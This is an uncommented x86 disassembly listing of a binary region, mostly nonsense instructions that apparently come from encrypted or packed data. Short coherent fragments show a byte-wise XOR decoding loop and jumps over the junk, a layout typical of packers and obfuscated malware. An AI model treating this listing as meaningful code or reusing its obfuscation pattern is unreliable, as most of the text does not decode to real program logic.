  404673:	xchg   edi,eax
  404674:	mov    al,ds:0xa22f985c
  404679:	stc    
  40467a:	int3   
  40467b:	add    eax,0x163ab078
  404680:	test   ax,0xf644
  404684:	push   es
  404685:	call   0x26ae:0xe90c5f0f
  40468c:	cmp    BYTE PTR ds:0xe1bef32b,bh
  404692:	xor    BYTE PTR [ecx+eiz*2],0x22
  404696:	(bad)  
  404697:	mov    eax,0x5af725ea
  40469c:	sub    esp,DWORD PTR [ebx+ecx*1]
  40469f:	pop    eax
  4046a0:	add    eax,0x453b19b1
  4046a5:	rol    ebp,0xf1
  4046a8:	cmp    ecx,esp
  4046aa:	in     al,0x8e
  4046ac:	ss push 0xfffffff5
  4046af:	adc    eax,DWORD PTR [esi+0x13]
  4046b2:	xor    al,0xd4
  4046b4:	jne    0x404685
  4046b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046b7:	std    
  4046b8:	cwde   
  4046b9:	iret   
  4046ba:	push   esi
  4046bb:	or     dl,BYTE PTR [edx]
  4046bd:	xchg   BYTE PTR [edi],al
  4046bf:	or     eax,0xa486235
  4046c4:	clc    
  4046c5:	sbb    DWORD PTR [ecx],esi
  4046c7:	xor    BYTE PTR [edi+ebp*2],dh
  4046ca:	jge    0x4046d2
  4046cc:	rcr    BYTE PTR [eax],cl
  4046ce:	add    ah,al
  4046d0:	mov    WORD PTR [esi],?
  4046d2:	fs push 0x56c3ca13
  4046d8:	cmc    
  4046d9:	and    al,0x64
  4046db:	iret   
  4046dc:	jl     0x404759
  4046de:	push   es
  4046df:	call   0x41aa:0xc81e93cb
  4046e6:	repnz fwait
  4046e8:	int    0xb3
  4046ea:	fst    QWORD PTR [ecx]
  4046ec:	fnsave [edi]
  4046ee:	idiv   DWORD PTR [ecx-0x20]
  4046f1:	clc    
  4046f2:	out    0xab,al
  4046f4:	pusha  
  4046f5:	or     eax,0x117b3904
  4046fa:	dec    edx
  4046fb:	sbb    dh,BYTE PTR [ebx-0x74d39a22]
  404701:	inc    ebp
  404702:	ror    BYTE PTR [ebx-0x53f02bb3],1
  404708:	enter  0xc102,0xe9
  40470c:	add    cl,BYTE PTR [ebx+0x558bd04d]
  404712:	aam    0x33
  404714:	mov    ecx,0xd2331ee1
  40471a:	or     eax,edx
  40471c:	lea    eax,[ebp+eax*1-0x4]
  404720:	mov    DWORD PTR [ebp-0x34],eax
  404723:	mov    eax,DWORD PTR [ebp-0x30]
  404726:	mov    ecx,DWORD PTR [ebp-0x2c]
  404729:	shrd   eax,ecx,0x2
  40472d:	shr    ecx,0x2
  404730:	mov    ecx,DWORD PTR [ebp-0x30]
  404733:	mov    edx,DWORD PTR [ebp-0x2c]
  404736:	shl    ecx,0x1e
  404739:	mov    ecx,DWORD PTR [ebp-0x14]
  40473c:	xor    eax,edi
  40473e:	xor    edx,edx
  404740:	or     eax,edx
  404742:	mov    cl,BYTE PTR [eax+ecx*1]
  404745:	mov    eax,DWORD PTR [ebp-0x34]
  404748:	xor    BYTE PTR [eax],cl
  40474a:	mov    eax,DWORD PTR [ebp-0x20]
  40474d:	mov    ecx,DWORD PTR [ebp-0x1c]
  404750:	shrd   eax,ecx,0x2
  404754:	shr    ecx,0x2
  404757:	mov    ecx,DWORD PTR [ebp-0x20]
  40475a:	mov    edx,DWORD PTR [ebp-0x1c]
  40475d:	xor    eax,edi
  40475f:	jmp    0x404b00
  404764:	xchg   esp,eax
  404765:	mov    esi,DWORD PTR [esi-0x434b497e]
  40476b:	fwait
  40476c:	or     al,dl
  40476e:	cli    
  40476f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404770:	cmp    al,0x43
  404772:	sbb    cl,dl
  404774:	mov    esi,0xbdbebe03
  404779:	les    edi,FWORD PTR [esi+0x24df5dbe]
  40477f:	fisttp DWORD PTR [edx+0x21]
  404782:	mov    esp,0x8a33eb55
  404787:	lods   eax,DWORD PTR ds:[esi]
  404788:	iret   
  404789:	fldcw  WORD PTR [esi-0x274bf13f]
  40478f:	mov    al,0xbc
  404791:	sbb    al,0x9e
  404793:	clc    
  404794:	pushf  
  404795:	sbb    BYTE PTR [edi],bh
  404797:	xchg   esi,eax
  404798:	pop    ebp
  404799:	inc    esp
  40479a:	cs (bad) 
  40479c:	scas   al,BYTE PTR es:[edi]
  40479d:	shr    BYTE PTR [ecx],cl
  40479f:	loope  0x4047a3
  4047a1:	mov    eax,ds:0xfe4b7c43
  4047a6:	scas   al,BYTE PTR es:[edi]
  4047a7:	cdq    
  4047a8:	pusha  
  4047a9:	popa   
  4047aa:	je     0x4047fe
  4047ac:	scas   eax,DWORD PTR es:[edi]
  4047ad:	mov    ds:0x4b3c495e,eax
  4047b2:	xchg   edx,eax
  4047b3:	xchg   ebp,eax
  4047b4:	pop    ss
  4047b5:	sub    BYTE PTR gs:[esi],bl
  4047b8:	mov    edi,DWORD PTR [edi-0x2f1913e3]
  4047be:	cmp    BYTE PTR [ecx-0x36],dl
  4047c1:	jno    0x40474c
  4047c3:	pop    ebp
  4047c4:	shl    BYTE PTR [eax],1
  4047c6:	pop    esi
  4047c7:	ror    BYTE PTR [ebp-0x11],cl
  4047ca:	ret    
  4047cb:	neg    DWORD PTR [ecx+eiz*2]
  4047ce:	jp     0x404783
  4047d0:	inc    esi
  4047d1:	pop    eax
  4047d2:	jns    0x404811
  4047d4:	mov    al,0x3b
  4047d6:	inc    esi
  4047d7:	fld    QWORD PTR [ebx+0x2d]
  4047da:	mov    al,0x88
  4047dc:	add    ecx,ebx
  4047de:	jge    0x4047c1
  4047e0:	or     ch,BYTE PTR [ecx+0x53]
  4047e3:	or     eax,DWORD PTR [edi-0x4f05eb52]
  4047e9:	je     0x40480d
  4047eb:	pop    ecx
  4047ec:	hlt    
  4047ed:	add    dl,BYTE PTR [esi+0x76deea4d]
  4047f3:	rol    BYTE PTR [edx-0x7b781b53],0xa1
  4047fa:	popf   
  4047fb:	fdivr  QWORD PTR [ecx]
  4047fd:	xchg   esp,eax
  4047fe:	popf   
  4047ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404800:	push   edi
  404801:	test   al,0x36
  404803:	xchg   ebp,eax
  404804:	jns    0x4047d2
  404806:	mov    ah,bl
  404808:	ret    0x704c
  40480b:	fmul   DWORD PTR [edx+0x11]
  40480e:	dec    ebp
  40480f:	adc    al,dl
  404811:	cmc    
  404812:	pop    esi
  404813:	jmp    0xce3d6cd9
  404818:	xchg   ecx,eax
  404819:	iret   
  40481a:	hlt    
  40481b:	pop    esi
  40481c:	adc    ah,BYTE PTR [ecx-0x1e5ec863]
  404822:	mov    edi,0xb7a7f7fb
  404827:	mov    edi,0xed7b5f47
  40482c:	cmc    
  40482d:	scas   eax,DWORD PTR es:[edi]
  40482e:	call   0xb93b8ce9
  404833:	xchg   ebp,eax
  404834:	cli    
  404835:	lea    ebx,[eax+0x9]
  404838:	add    eax,0x9c4d7d66
  40483d:	ins    BYTE PTR es:[edi],dx
  40483e:	imul   esp,eax,0x4c
  404841:	xlat   BYTE PTR ds:[ebx]
  404842:	sbb    eax,0x9d9f003c
  404847:	mov    ah,0x55
  404849:	mov    ebp,0xe6570223
  40484e:	and    BYTE PTR [esi+0x6bdae516],0x27
  404855:	out    0x57,eax
  404857:	sahf   
  404858:	lea    edx,[edx-0x5330b15e]
  40485e:	mov    ecx,0x3498eef9
  404863:	retf   
  404864:	loopne 0x4048d9
  404866:	push   esi
  404867:	fwait
  404868:	mov    al,ds:0x2e7a7e14
  40486d:	add    eax,0x542380b8
  404872:	sub    ch,al
  404874:	je     0x404836
  404876:	xor    esp,ebx
  404878:	adc    ch,BYTE PTR [ecx]
  40487a:	and    edi,DWORD PTR [ebp-0x60e7d7d7]
  404880:	inc    esp
  404881:	sub    BYTE PTR [esi],0xab
  404884:	inc    edi
  404885:	pushf  
  404886:	sahf   
  404887:	lahf   
  404888:	pop    edi
  404889:	xchg   esp,eax
  40488a:	repz call 0x57c2:0xf3722e92
  404892:	and    eax,0xe2bf1a81
  404897:	dec    ecx
  404898:	or     DWORD PTR [esi-0x5400cdb9],edx
  40489e:	inc    ebx
  40489f:	or     BYTE PTR [ebx-0x2e58f12b],dl
  4048a5:	inc    ebx
  4048a6:	in     al,0xf0
  4048a8:	imul   esp,DWORD PTR [ebp+0x39],0xc86c3c8c
  4048af:	dec    ecx
  4048b0:	fsub   DWORD PTR ds:0x28a9da15
  4048b6:	push   eax
  4048b7:	push   edi
  4048b8:	jge    0x4048da
  4048ba:	fst    QWORD PTR [eax]
  4048bc:	or     dl,0x14
  4048bf:	scas   al,BYTE PTR es:[edi]
  4048c0:	fisub  WORD PTR [esi]
  4048c2:	mov    ebx,0xc121c801
  4048c7:	jb     0x4048e7
  4048c9:	neg    BYTE PTR [ebx]
  4048cb:	inc    esp
  4048cc:	push   ecx
  4048cd:	sbb    DWORD PTR [ebx-0x45],ecx
  4048d0:	mov    edi,0xf7b56914
  4048d5:	sar    BYTE PTR [eax+0x4d],cl
  4048d8:	mov    ds:0xcfd08aaf,eax
  4048dd:	dec    esi
  4048de:	dec    ebx
  4048df:	retf   
  4048e0:	add    al,0x27
  4048e2:	and    DWORD PTR [edi],ecx
  4048e4:	add    al,0xea
  4048e6:	push   cs
  4048e7:	not    esi
  4048e9:	and    BYTE PTR [eax-0x6d42370f],ch
  4048ef:	inc    esp
  4048f0:	pop    esp
  4048f1:	xor    bh,BYTE PTR [ecx+0x26]
  4048f4:	or     al,0x7d
  4048f6:	xor    DWORD PTR [edx-0x63],eax
  4048f9:	fistp  WORD PTR [ecx-0x58]
  4048fc:	sub    DWORD PTR [edi+ebp*2-0xf],edx
  404900:	rcl    ecx,1
  404902:	add    esp,DWORD PTR [ebp+esi*2-0x1e]
  404906:	mov    cl,0xa6
  404908:	adc    eax,0x13597afb
  40490d:	sahf   
  40490e:	dec    esp
  40490f:	leave  
  404910:	xchg   DWORD PTR [ebp+0x49],ebp
  404913:	cwde   
  404914:	outs   dx,BYTE PTR ds:[esi]
  404915:	push   esi
  404916:	mov    ah,0xfa
  404918:	and    eax,0x9cbd6cc
  40491d:	or     DWORD PTR ds:[edi+0x6151caf7],edi
  404924:	cmc    
  404925:	in     al,0x9
  404927:	jl     0x40498b
  404929:	push   ds
  40492a:	mov    al,0x7
  40492c:	outs   dx,BYTE PTR ds:[esi]
  40492d:	push   ss
  40492e:	icebp  
  40492f:	fcomi  st,st(7)
  404931:	push   0x3e
  404933:	shl    BYTE PTR [ebx+0x70],0x34
  404937:	in     eax,0x88
  404939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40493a:	inc    eax
  40493b:	lods   al,BYTE PTR ds:[esi]
  40493c:	or     al,0xa8
  40493e:	aaa    
  40493f:	mov    bl,0x99
  404941:	jno    0x40494a
  404943:	jns    0x4048ed
  404945:	mov    edi,0xe1625263
  40494a:	inc    DWORD PTR [eax+0x43]
  40494d:	cmp    eax,0x97632c95
  404952:	test   DWORD PTR [edx],ebp
  404954:	hlt    
  404955:	ins    DWORD PTR es:[edi],dx
  404956:	push   edi
  404957:	jno    0x4048e3
  404959:	das    
  40495a:	repz in al,0x7e
  40495d:	cs jecxz 0x404998
  404960:	xlat   BYTE PTR ds:[ebx]
  404961:	idiv   BYTE PTR [esi]
  404963:	pop    esi
  404964:	aad    0x90
  404966:	adc    al,BYTE PTR [ecx+edx*1-0x6af2863f]
  40496d:	scas   eax,DWORD PTR es:[edi]
  40496e:	loope  0x40497d
  404970:	xchg   edx,eax
  404971:	rcl    DWORD PTR [edi],cl
  404973:	cmp    ebx,DWORD PTR [ebx]
  404975:	std    
  404976:	je     0x40496d
  404978:	ja     0x40491c
  40497a:	push   0x15d457a2
  40497f:	int3   
  404980:	iret   
  404981:	gs mov al,0x72
  404984:	sub    eax,0x2d028fd4
  404989:	int    0x2c
  40498b:	lahf   
  40498c:	jb     0x4049c7
  40498e:	dec    eax
  40498f:	jmp    0x404923
  404991:	jno    0x4049ea
  404993:	xchg   ecx,eax
  404994:	je     0x4049e5
  404996:	jne    0x4049e9
  404998:	mov    ebx,0xe0b8a5e
  40499d:	ja     0x404952
  40499f:	rol    DWORD PTR [ecx-0x43],cl
  4049a2:	ins    DWORD PTR es:[edi],dx
  4049a3:	add    eax,0x910600b1
  4049a8:	(bad)  
  4049a9:	(bad)  
  4049aa:	cmp    dh,al
  4049ac:	inc    ebp
  4049ad:	in     al,0xf2
  4049af:	or     eax,DWORD PTR [edx]
  4049b1:	retf   
  4049b2:	and    al,0xd7
  4049b4:	shr    bl,cl
  4049b6:	idiv   ah
  4049b8:	imul   eax,DWORD PTR [esi+0x3aabe7f3],0x6c99ad49
  4049c2:	sbb    bl,cl
  4049c4:	mov    ah,0x3e
  4049c6:	pop    ds
  4049c7:	test   bl,dh
  4049c9:	lds    ebp,FWORD PTR [edi+ecx*2-0x5a0f53e1]
  4049d0:	fsub   QWORD PTR [edi-0x3300bf90]
  4049d6:	je     0x4049cd
  4049d8:	outs   dx,DWORD PTR ds:[esi]
  4049d9:	push   ecx
  4049da:	retf   0x558b
  4049dd:	mov    al,ds:0x431fbccd
  4049e2:	sub    DWORD PTR [ebp+0x687f1c5],ebp
  4049e8:	jns    0x4049d3
  4049ea:	sti    
  4049eb:	jae    0x40496e
  4049ed:	in     al,0x31
  4049ef:	jmp    0x404a59
  4049f1:	jmp    0x882900fc
  4049f6:	sub    esp,DWORD PTR [ecx-0x5c]
  4049f9:	scas   al,BYTE PTR es:[edi]
  4049fa:	(bad)  
  4049fc:	cmp    bh,BYTE PTR ss:[edx]
  4049ff:	pop    ss
  404a00:	imul   ebx,DWORD PTR [edx],0xffffff84
  404a03:	push   ds
  404a04:	push   esi
  404a05:	inc    ebp
  404a06:	inc    edx
  404a07:	imul   ecx,DWORD PTR [ecx],0xc7f88817
  404a0d:	mov    ds:0x16b4e974,al
  404a12:	pop    eax
  404a13:	or     eax,0xb24d5288
  404a18:	ds cmc 
  404a1a:	data16 jl 0x404a54
  404a1d:	popf   
  404a1e:	mov    edi,0x413de520
  404a23:	loop   0x404a60
  404a25:	fsub   DWORD PTR [ecx+0x4d]
  404a28:	mov    eax,ds:0x59a35408
  404a2d:	push   cs
  404a2e:	repz fnstsw WORD PTR [edx]
  404a31:	cmp    edi,DWORD PTR gs:[edi+0x323e8ab3]
  404a38:	cmp    al,0x3a
  404a3a:	xchg   esp,eax
  404a3b:	jns    0x404a2a
  404a3d:	or     al,0xb5
  404a3f:	inc    ecx
  404a40:	in     eax,0xf
  404a42:	or     al,0xc8
  404a44:	dec    edx
  404a45:	into   
  404a46:	jb     0x404a5b
  404a48:	sub    edx,DWORD PTR [esi-0x5205c974]
  404a4e:	pop    edx
  404a4f:	dec    ecx
  404a50:	mov    ds:0x8992351c,al
  404a55:	daa    
  404a56:	std    
  404a57:	ja     0x404abc
  404a59:	inc    esi
  404a5a:	adc    al,0xd2
  404a5c:	inc    ebx
  404a5d:	add    BYTE PTR [eax],bh
  404a5f:	xchg   BYTE PTR [ebx-0x45],dl
  404a62:	fstp   st(0)
  404a64:	or     al,bh
  404a66:	jns    0x404a12
  404a68:	mov    ecx,0x1ae9b5b7
  404a6d:	pusha  
  404a6e:	cmp    al,0x56
  404a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a71:	dec    eax
  404a72:	out    0x85,eax
  404a74:	fs jg  0x4049fe
  404a77:	ins    DWORD PTR es:[edi],dx
  404a78:	add    al,0xf1
  404a7a:	pop    ebx
  404a7b:	sbb    eax,0x945d02c3
  404a80:	add    eax,DWORD PTR [eax+0x9cf027c]
  404a86:	arpl   bx,dx
  404a88:	test   DWORD PTR [edx-0x2b],0x34bc63a
  404a8f:	mov    ah,0x3d
  404a91:	shr    ecx,cl
  404a93:	jge    0x404ab0
  404a95:	mov    al,0xdc
  404a97:	mov    esi,0xde38f5db
  404a9c:	pop    ebx
  404a9d:	dec    ebp
  404a9e:	sub    DWORD PTR [ecx+ebx*1],edx
  404aa1:	push   0xdb19ecef
  404aa6:	inc    edx
  404aa7:	mov    ds:0x119e2f49,al
  404aac:	add    DWORD PTR [edx-0x116a882e],esi
  404ab2:	outs   dx,BYTE PTR ds:[esi]
  404ab3:	mov    al,ds:0x41aa85a4
  404ab8:	arpl   WORD PTR [ebp+0x3816b8eb],sp
  404abe:	ror    edx,0x2b
  404ac1:	loopne 0x404af6
  404ac3:	add    al,BYTE PTR [edi+ebp*1-0x4d]
  404ac7:	fdivr  st(0),st
  404ac9:	cmp    BYTE PTR [ebx],bh
  404acb:	or     DWORD PTR [eax-0x7d],ebp
  404ace:	(bad)  
  404acf:	out    dx,eax
  404ad0:	ss pushf 
  404ad2:	das    
  404ad3:	xchg   esi,eax
  404ad4:	es std 
  404ad6:	fsubrp st(3),st
  404ad8:	mov    ebx,0x7b8ba5af
  404add:	sbb    bl,BYTE PTR [esp+eiz*8]
  404ae0:	pop    esp
  404ae1:	push   esi
  404ae2:	dec    ecx
  404ae3:	push   0xffffffba
  404ae5:	fstp   QWORD PTR [ebp-0x80]
  404ae8:	arpl   dx,dx
  404aea:	and    edx,DWORD PTR [esi]
  404aec:	in     al,0x65
  404aee:	cmp    ecx,DWORD PTR [ecx+0x5fab3677]
  404af4:	push   esp
  404af5:	in     al,dx
  404af6:	ret    0xc0a8
  404af9:	sub    cl,BYTE PTR [esi+0x6c]
  404afc:	xor    ebp,DWORD PTR [ecx-0x62]
  404aff:	lods   eax,DWORD PTR ds:[esi]
  404b00:	shl    ecx,0x1e
  404b03:	xor    edx,edx
  404b05:	or     eax,edx
  404b07:	lea    eax,[ebp+eax*1-0x4]
  404b0b:	mov    DWORD PTR [ebp-0x34],eax
  404b0e:	mov    eax,DWORD PTR [ebp-0x20]
  404b11:	mov    ecx,DWORD PTR [ebp-0x1c]
  404b14:	shrd   eax,ecx,0x2
  404b18:	shr    ecx,0x2
  404b1b:	mov    ecx,DWORD PTR [ebp-0x20]
  404b1e:	mov    edx,DWORD PTR [ebp-0x1c]
  404b21:	shl    ecx,0x1e
  404b24:	mov    ecx,DWORD PTR [ebp-0x14]
  404b27:	jmp    0x404ec8
  404b2c:	cmp    BYTE PTR [edx],ch
  404b2e:	push   0xffffff83
  404b30:	jl     0x404ab5
  404b32:	cmp    BYTE PTR [edx-0x61edfbc6],bh
  404b38:	int3   
  404b39:	bound  eax,QWORD PTR [eax]
  404b3b:	fnstsw WORD PTR [ebp-0x424141f7]
  404b41:	les    edi,FWORD PTR [esi-0x4093e142]
  404b47:	mov    WORD PTR [edi-0x78],cs
  404b4a:	(bad)  
  404b4c:	jbe    0x404b1d
  404b4e:	push   cs
  404b4f:	push   0x804d7a91
  404b54:	cmp    esi,DWORD PTR [edx-0x46]
  404b57:	fcmovb st,st(2)
  404b59:	into   
  404b5a:	jmp    0xfaf3:0xc93e8169
  404b61:	(bad)
  404b64:	pop    es
  404b65:	sbb    ecx,ecx
  404b67:	and    al,0xb0
  404b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6a:	pop    edi
  404b6b:	iret   
  404b6c:	jecxz  0x404b89
  404b6e:	lahf   
  404b6f:	outs   dx,DWORD PTR ds:[esi]
  404b70:	or     DWORD PTR [esi+0x2f],ebp
  404b73:	dec    ecx
  404b74:	jbe    0x404bc2
  404b76:	mov    ebp,0x646453ae
  404b7b:	dec    ebp
  404b7c:	jp     0x404bb2
  404b7e:	outs   dx,BYTE PTR ds:[esi]
  404b7f:	shl    DWORD PTR [edi-0x29b9874a],cl
  404b85:	ret    
  404b86:	push   ss
  404b87:	jp     0x404bc2
  404b89:	jns    0x404bb5
  404b8b:	das    
  404b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b8d:	(bad)  
  404b8f:	xor    DWORD PTR [eax+0x1b09279f],ebp
  404b95:	stc    
  404b96:	call   0x4a4eb6b1
  404b9b:	sub    al,0x80
  404b9d:	test   eax,0x4b211912
  404ba2:	sbb    al,0xe1
  404ba4:	xchg   ebx,eax
  404ba5:	in     eax,dx
  404ba6:	sub    BYTE PTR [ecx],bl
  404ba8:	jmp    FWORD PTR [edx+0x682480c1]
  404bae:	test   DWORD PTR [ebp-0x5be2d98f],ebp
  404bb4:	mov    dl,0x6c
  404bb6:	cwde   
  404bb7:	sub    eax,0x3122170e
  404bbc:	push   esi
  404bbd:	push   eax
  404bbe:	je     0x404c20
  404bc0:	add    BYTE PTR [ebp+ebp*1+0x2c5ae0ae],dh
  404bc7:	xor    BYTE PTR [ebp-0x490f29aa],cl
  404bcd:	mov    esi,0xc51fa1db
  404bd2:	xchg   esp,eax
  404bd3:	add    al,0x81
  404bd5:	ss das 
  404bd7:	or     ecx,esp
  404bd9:	sub    eax,0xe23f5e46
  404bde:	mov    esi,0x3c477a4
  404be3:	mov    ch,0x46
  404be5:	loope  0x404c06
  404be7:	add    eax,0x99c1680d
  404bec:	add    BYTE PTR [edx+0x30e6f08d],al
  404bf2:	dec    edx
  404bf3:	fst    QWORD PTR [esi-0x10]
  404bf6:	gs mov esi,0x5e07a66a
  404bfc:	fmul   st,st(6)
  404bfe:	sahf   
  404bff:	jae    0x404c4b
  404c01:	arpl   WORD PTR [ecx+0xb28b70f],bx
  404c07:	or     DWORD PTR [eax+0x479049d9],0xffffff94
  404c0e:	inc    ebp
  404c0f:	inc    esi
  404c10:	loopne 0x404bb4
  404c12:	adc    DWORD PTR [edx],ecx
  404c14:	lock add BYTE PTR [edi-0x7c9a88b0],ch
  404c1b:	js     0x404c9c
  404c1d:	lods   eax,DWORD PTR ds:[esi]
  404c1e:	mov    esi,esi
  404c20:	adc    DWORD PTR [edi],0x46
  404c23:	push   0x6baa0f1b
  404c28:	pop    edx
  404c29:	pop    edi
  404c2a:	mov    dl,0xdf
  404c2c:	call   0xb8746866
  404c31:	call   0xde9dbe17
  404c36:	jmp    0x34c1:0x27f6703f
  404c3d:	xchg   edi,eax
  404c3e:	fsubr  st(2),st
  404c40:	popa   
  404c41:	test   eax,0x5a301e2a
  404c46:	pop    esp
  404c47:	stos   BYTE PTR es:[edi],al
  404c48:	outs   dx,DWORD PTR ds:[esi]
  404c49:	ja     0x404cc2
  404c4b:	cli    
  404c4c:	sbb    ch,BYTE PTR [ecx-0x7]
  404c4f:	fwait
  404c50:	pop    ecx
  404c51:	dec    edi
  404c52:	and    al,0x53
  404c54:	or     bh,BYTE PTR [esi-0x7f88162]
  404c5a:	or     al,0xc9
  404c5c:	clc    
  404c5d:	ret    0x2588
  404c60:	(bad)  
  404c61:	sbb    al,0xf6
  404c63:	xor    eax,0x177d6164
  404c68:	retf   0x3569
  404c6b:	dec    esi
  404c6c:	push   ecx
  404c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c6e:	cmp    eax,0xa0bf1086
  404c73:	xor    al,0xf8
  404c75:	pop    edx
  404c76:	push   es
  404c77:	ficom  WORD PTR [ebx]
  404c79:	mov    ds:0x7f5889cd,eax
  404c7e:	leave  
  404c7f:	mov    dh,0xf2
  404c81:	mov    ds:0xa399fcb7,al
  404c86:	push   esp
  404c87:	int    0x15
  404c89:	jecxz  0x404c8e
  404c8b:	sahf   
  404c8c:	loope  0x404ca9
  404c8e:	into   
  404c8f:	pop    eax
  404c90:	mov    ebp,0xd39cd624
  404c95:	add    al,bl
  404c97:	(bad)  
  404c99:	bound  edi,QWORD PTR [ecx+eax*4]
  404c9c:	mov    dh,0x19
  404c9e:	xchg   edx,eax
  404c9f:	out    dx,al
  404ca0:	pop    edi
  404ca1:	cdq    
  404ca2:	ins    DWORD PTR es:[edi],dx
  404ca3:	adc    eax,0xe38bdd4e
  404ca8:	cmp    al,0xbb
  404caa:	adc    eax,esp
  404cac:	cmp    esi,ecx
  404cae:	xor    BYTE PTR [ecx],cl
  404cb0:	repnz push 0x87dacab6
  404cb6:	call   0x725c7627
  404cbb:	push   ebp
  404cbc:	pop    ss
  404cbd:	dec    ebx
  404cbe:	xchg   ecx,eax
  404cbf:	out    0x53,al
  404cc1:	jge    0x404c62
  404cc3:	stos   DWORD PTR es:[edi],eax
  404cc4:	adc    esi,DWORD PTR [edx+0x22ed4838]
  404cca:	xor    ah,BYTE PTR [edx-0x63cc1f4f]
  404cd0:	pop    ecx
  404cd1:	gs push ss
  404cd3:	jge    0x404c85
  404cd5:	in     al,0xe2
  404cd7:	(bad)  
  404cd8:	std    
  404cd9:	pop    ss
  404cda:	mov    dh,0x3c
  404cdc:	in     eax,0x1a
  404cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cdf:	jo     0x404d43
  404ce1:	xor    BYTE PTR [edi+0x79],0xc
  404ce5:	mov    WORD PTR [eax],fs
  404ce7:	add    ecx,ecx
  404ce9:	jg     0x404cbc
  404ceb:	or     BYTE PTR [ecx+ecx*8+0x5b],0x66
  404cf0:	sti    
  404cf1:	add    BYTE PTR ds:0xc4226bcc,bh
  404cf7:	outs   dx,BYTE PTR ds:[esi]
  404cf8:	ins    BYTE PTR es:[edi],dx
  404cf9:	fld    QWORD PTR [eax+0x1f]
  404cfc:	xlat   BYTE PTR ds:[ebx]
  404cfd:	daa    
  404cfe:	cmp    dl,ch
  404d00:	sub    ah,ah
  404d02:	jmp    0xa538:0x97600a2
  404d09:	xor    al,0x3f
  404d0b:	adc    eax,0xc0be86fa
  404d10:	das    
  404d11:	and    al,0x8a
  404d13:	mov    al,0xbc
  404d15:	lea    edx,[edx+0x13c3f317]
  404d1b:	fwait
  404d1c:	or     edx,DWORD PTR [edi]
  404d1e:	xchg   BYTE PTR [ebp-0x4f],dh
  404d21:	cmp    esp,DWORD PTR [eax]
  404d23:	sbb    eax,0x98cc8eb0
  404d28:	pop    ds
  404d29:	sbb    BYTE PTR [ecx+0x46b7a71e],0x4c
  404d30:	adc    esp,edx
  404d32:	sbb    ebx,ebp
  404d34:	pop    ebp
  404d35:	and    cl,bl
  404d37:	arpl   dx,ax
  404d39:	and    bl,bh
  404d3b:	nop
  404d3c:	iret   
  404d3d:	jmp    0xcceb4bc6
  404d42:	cmc    
  404d43:	or     ah,ah
  404d45:	mov    DWORD PTR [edx+0x218752f6],edi
  404d4b:	jmp    0xdc07ce51
  404d50:	jmp    0x14db62fd
  404d55:	call   0xa8e970f4
  404d5a:	gs xchg ebx,edx
  404d5d:	mov    dl,0x97
  404d5f:	out    0x7b,al
  404d61:	inc    esp
  404d62:	sub    eax,0x1f872061
  404d67:	xchg   ebp,eax
  404d68:	xchg   ebp,eax
  404d69:	mov    al,ds:0xc711f3ba
  404d6e:	call   0x617536a0
  404d73:	cmc    
  404d74:	push   edx
  404d75:	outs   dx,DWORD PTR ds:[esi]
  404d76:	mov    edi,esp
  404d78:	repz mov edx,0x9e49cb39
  404d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7f:	cmc    
  404d80:	push   eax
  404d81:	std    
  404d82:	leave  
  404d83:	or     cl,dh
  404d85:	mov    edi,DWORD PTR [edx-0x5e2d8fec]
  404d8b:	fld    TBYTE PTR ss:[esi]
  404d8e:	mov    esp,0xe809d173
  404d93:	vmovsd xmm5,xmm7,xmm0
  404d97:	imul   ebx,ebp,0xffffffe3
  404d9a:	or     dl,BYTE PTR es:[ebp+0x2e]
  404d9e:	cmp    BYTE PTR [ebp+0x2e29ef9f],dh
  404da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404da5:	xor    BYTE PTR [edi],ah
  404da7:	lahf   
  404da8:	mov    edx,0x9f17b6b3
  404dad:	pop    ebp
  404dae:	in     eax,dx
  404daf:	rcr    bl,cl
  404db1:	aam    0x2a
  404db3:	dec    eax
  404db4:	es out 0xb2,eax
  404db7:	cmp    eax,0x77d50b48
  404dbc:	sbb    ebx,DWORD PTR [ebp-0x76]
  404dbf:	mov    esi,0xfe2098d1
  404dc4:	xchg   edi,eax
  404dc5:	sub    ah,al
  404dc7:	cs mov ebp,0x491f53c7
  404dcd:	cli    
  404dce:	(bad)  
  404dd0:	push   esp
  404dd1:	bound  eax,QWORD PTR [ecx]
  404dd3:	jmp    0xaf25:0xd4a6b742
  404dda:	xchg   edx,eax
  404ddb:	push   ebx
  404ddc:	fdivr  DWORD PTR [ebx-0x74346b80]
  404de2:	(bad)  
  404de4:	lea    edi,[ecx+0x36]
  404de7:	pop    eax
  404de8:	imul   ebp,DWORD PTR [edx+edi*4-0x672ac706],0x112602ec
  404df3:	push   edx
  404df4:	into   
  404df5:	rol    DWORD PTR [ebx-0x5f33005e],0x2b
  404dfc:	push   ebp
  404dfd:	sbb    DWORD PTR [ecx+edi*8-0x2],0x66
  404e02:	mov    ds:0xc1403aab,al
  404e07:	int3   
  404e08:	stos   DWORD PTR es:[edi],eax
  404e09:	dec    ebp
  404e0a:	sbb    eax,0x87eaf14c
  404e0f:	mov    al,bh
  404e11:	jl     0x404e8c
  404e13:	and    edi,DWORD PTR [edi]
  404e15:	jle    0x404e6d
  404e17:	pusha  
  404e18:	loope  0x404e95
  404e1a:	xchg   edx,eax
  404e1b:	(bad)  
  404e1c:	out    0x1f,eax
  404e1e:	cmp    eax,0xffdf6127
  404e23:	cs mov eax,0x2092a785
  404e29:	daa    
  404e2a:	dec    esi
  404e2b:	jae    0x404e2c
  404e2d:	xchg   ebx,eax
  404e2e:	call   0xfee4:0xb68ef837
  404e35:	xchg   edx,eax
  404e36:	push   ebx
  404e37:	sub    ebp,DWORD PTR gs:[eax+esi*2]
  404e3b:	jmp    FWORD PTR [ebx]
  404e3d:	sub    al,0xd4
  404e3f:	jns    0x404e8f
  404e41:	retf   
  404e42:	push   cs
  404e43:	jns    0x404e0f
  404e45:	dec    edi
  404e46:	or     al,0x22
  404e48:	dec    edx
  404e49:	mov    ds,WORD PTR [ecx+0x3645d83c]
